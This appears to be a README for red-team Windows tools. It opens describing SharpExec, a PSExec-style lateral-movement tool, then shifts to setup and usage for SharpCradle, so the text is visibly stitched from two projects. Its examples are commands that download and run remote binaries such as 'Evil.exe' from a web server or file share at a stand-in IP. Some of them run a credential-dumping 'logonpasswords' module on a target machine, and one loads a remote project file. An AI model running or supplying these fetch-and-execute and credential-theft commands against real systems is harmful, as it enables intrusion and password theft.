# SharpExec

Description
============

SharpExec is a tool written in C# and designed to help penetration testers or red teams perform lateral movement within a MS Windows environment. It currently includes a PSExec module that allows you to execute a remote binary with arguments, for example, cmd.exe as NT Authority/System

Contact at:
- Twitter: @anthemtotheego

Quick blog:

http://blog.redxorblue.com/2018/10/sharpcradle-loading-remote-c-binaries.html

**Before submitting issues, this tool may not always be updated actively. I encourage you to borrow, add, mod, and/or make your own.  Remember, all the awesome code out there (and there is a lot) can be taken/modified to create your own custom tools.**

![Alt text](/SCradle.PNG?raw=true "SharpCradle")
![Alt text](/SCradle_2.PNG?raw=true "")

Setup - Quick and Dirty
==============================

**Note: For those of you who don't want to go through the trouble of compiling your own I uploaded an x64 and x86 binary found in the CompiledBinaries folder.  For those of you who do want to compile your own... I used Windows 10, Visual Studio 2017 - mileage may vary**

1. Download SharpCradle tool and open up SharpCradle.sln                         

2. Compile for correct architecture (x64 or x86), drop binary on target computer and have fun.

Note: architecture of SharpCradle and binary you are retrieving should be the same or it might throw errors.

Examples 
========

Web Server Download:

```SharpCradle.exe -w https://IP/Evil.exe <arguments to pass>```

```SharpCradle.exe -w https://IP/SharpSploitConsole_x64.exe logonpasswords```

File Server Download Anonymous:

```SharpCradle.exe -f \\IP\share\Evil.exe <arguments to pass>```

```SharpCradle.exe -f \\IP\share\SharpSploitConsole_x64.exe logonpasswords```

File Server Download With Creds:

```SharpCradle.exe -f -c domain username password \\IP\share\Evil.exe <arguements to pass>```

```SharpCradle.exe -f -c domain username password \\IP\share\SharpSploitConsole_x64.exe logonpasswords```

Download .NET inline project file from web:

```SharpCradle.exe -p https://192.168.1.10/EvilProject.csproj```

